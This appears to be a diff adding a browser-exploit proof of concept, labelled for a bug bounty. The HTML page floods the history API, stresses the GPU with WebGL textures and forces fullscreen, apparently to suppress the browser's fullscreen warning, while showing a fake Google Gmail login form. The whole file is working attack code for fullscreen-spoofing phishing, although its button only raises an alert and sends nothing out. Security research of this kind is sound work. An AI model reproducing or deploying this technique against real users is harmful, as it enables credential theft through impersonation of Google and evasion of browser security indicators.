@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC v2b - GPU + History Flood</title>
+    <style>
+        body, html { margin: 0; padding: 0; overflow: hidden; background: #202124; font-family: 'Segoe UI', sans-serif; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        #payload { display: none; color: white; text-align: center; padding-top: 10vh; }
+        .warning-header { color: #ff4444; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        .login-box { background: white; color: #202124; width: 350px; margin: 0 auto; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button.login-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
+        #initial-ui { position: relative; z-index: 100; text-align: center; color: #0f0; padding-top: 20vh; }
+        .attack-btn { padding: 40px; font-size: 24px; cursor: pointer; background: #111; color: #0f0; border: 5px double #0f0; }
+        #log { position: fixed; bottom: 60px; left: 10px; color: #0f0; font-size: 11px; font-family: monospace; z-index: 999; background: rgba(0,0,0,0.7); padding: 8px; border-radius: 4px; display: none; max-width: 90vw; }
+        .variant-tag { position: fixed; top: 10px; right: 10px; background: #e8710a; color: white; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; z-index: 9999; }
+    </style>
+</head>
+<body>
+    <canvas id="glCanvas"></canvas>
+    <div class="variant-tag">v2b: GPU + HistoryFlood</div>
+
+    <div id="initial-ui">
+        <h2 style="color:#aaa;font-size:14px;margin-bottom:4px;">ISOLATED TEST</h2>
+        <h1>v2b: GPU Stress + History Flood</h1>
+        <p style="color:#aaa;">No main thread block. No message flood. No focus exploit.</p>
+        <button id="go" class="attack-btn">LAUNCH v2b</button>
+    </div>
+
+    <div id="payload">
+        <div class="warning-header">** (Bug Bounty) v2b: GPU + History Flood **</div>
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
+            <h3>POC</h3>
+            <p>Gmail</p>
+            <input type="text" placeholder="Email">
+            <input type="password" placeholder="Password">
+            <button class="login-btn" onclick="alert('v2b Success')">Next</button>
+        </div>
+    </div>
+
+    <div id="log"></div>
+
+    <script>
+        const btn = document.getElementById('go');
+        const initialUI = document.getElementById('initial-ui');
+        const payload = document.getElementById('payload');
+        const canvas = document.getElementById('glCanvas');
+        const log = document.getElementById('log');
+
+        function addLog(msg) {
+            log.style.display = 'block';
+            log.innerHTML += msg + '<br>';
+        }
+
+        btn.onclick = () => {
+            initialUI.style.display = 'none';
+            payload.style.display = 'block';
+
+            // --- PRIMITIVE 1: History Flood PRE-fullscreen ---
+            // replaceState 800x sebelum request — overwhelm navigation stack
+            const hStart = performance.now();
+            for (let i = 0; i < 800; i++) {
+                history.replaceState(null, '', '#' + Math.random());
+            }
+            addLog(`[HIST] 800x replaceState in ${(performance.now() - hStart).toFixed(2)}ms`);
+
+            // --- PRIMITIVE 2: GPU Stress ---
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const t0 = performance.now();
+                for (let i = 0; i < 1000; i++) {
+                    const tex = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, tex);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2, 2, 0, gl.RGBA, gl.UNSIGNED_BYTE,
+                        new Uint8Array([255,0,0,255, 255,0,0,255, 255,0,0,255, 255,0,0,255]));
+                }
+                addLog(`[GPU] 1000 textures in ${(performance.now() - t0).toFixed(2)}ms`);
+            } else {
+                addLog('[GPU] WebGL unavailable');
+            }
+
+            // --- PRIMITIVE 3: requestFullscreen ---
+            const fsStart = performance.now();
+            document.documentElement.requestFullscreen().then(() => {
+                addLog(`[FS] Fullscreen resolved in ${(performance.now() - fsStart).toFixed(2)}ms`);
+
+                // History flood POST-fullscreen juga — double pressure
+                // pushState + back untuk saturasi navigation IPC channel
+                const h2Start = performance.now();
+                for (let i = 0; i < 400; i++) {
+                    history.pushState(null, '', '#' + Math.random());
+                }
+                addLog(`[HIST-POST] 400x pushState in ${(performance.now() - h2Start).toFixed(2)}ms`);
+
+            }).catch(e => addLog(`[FS] Error: ${e}`));
+        };
+    </script>
+</body>
+</html>
